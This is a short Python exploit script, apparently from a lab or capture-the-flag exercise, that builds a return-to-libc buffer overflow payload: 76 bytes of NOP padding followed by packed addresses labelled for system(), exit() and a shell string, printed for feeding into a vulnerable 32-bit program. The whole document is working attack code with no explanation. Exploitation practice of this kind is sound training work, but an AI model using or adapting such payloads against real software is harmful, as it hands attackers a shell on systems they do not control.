import struct

pad = b"\x90"*76
system = struct.pack('I', 0xb7e6b060)
ext = struct.pack('I', 0xb7e5ebe0)
shell = struct.pack('I', 0xbffff915)

print(pad + system + ext + shell)
